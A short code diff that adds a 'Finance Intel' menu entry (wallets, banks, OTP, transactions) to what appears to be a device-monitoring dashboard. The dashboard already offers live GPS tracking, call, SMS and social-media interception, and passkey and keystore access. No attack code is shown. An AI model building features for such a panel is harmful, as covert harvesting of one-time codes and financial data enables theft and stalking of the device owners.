@@ -24,6 +24,7 @@ const QUICK = [
   { href: "/map",       label: "Live Map",         sub: "GPS tracker — all devices" },
   { href: "/comms",     label: "Comms Intel",      sub: "Calls · SMS · Social media" },
   { href: "/biometrics",label: "Biometrics",       sub: "Lock · Passkeys · Keystore" },
+  { href: "/finance",   label: "Finance Intel",   sub: "Wallets · Banks · OTP · TX" },
 ];
 
 function LiveClock() {
